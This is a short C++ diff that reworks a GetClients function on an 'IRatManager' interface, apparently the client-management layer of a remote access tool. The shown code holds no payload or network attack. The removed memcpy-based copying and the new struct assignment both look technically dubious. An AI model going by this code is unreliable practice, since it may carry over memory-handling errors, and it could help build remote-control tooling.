@@ -17,23 +17,9 @@ int GetClientCount(const IRatManager* manager)
 	return manager->GetClientCount();
 }
 
-IClientPipe** GetClients(IRatManager* manager)
+void GetClients(IRatManager* manager, ClientInfo* infos)
 {
-	const auto clients = manager->GetClients();
-
-	const auto clientsRaw = new IClientPipe* [clients.size()];
-	int index = 0;
-
-	for (const auto& client : manager->GetClients())
-	{
-		IClientPipe* clientCopy = nullptr;
-		std::memcpy(&clientCopy, client.get(), sizeof client);
-
-		clientsRaw[index] = clientCopy;
-		index++;
-	}
-
-	return clientsRaw;
+	*infos = *manager->GetClients();
 }
 
 int Send(
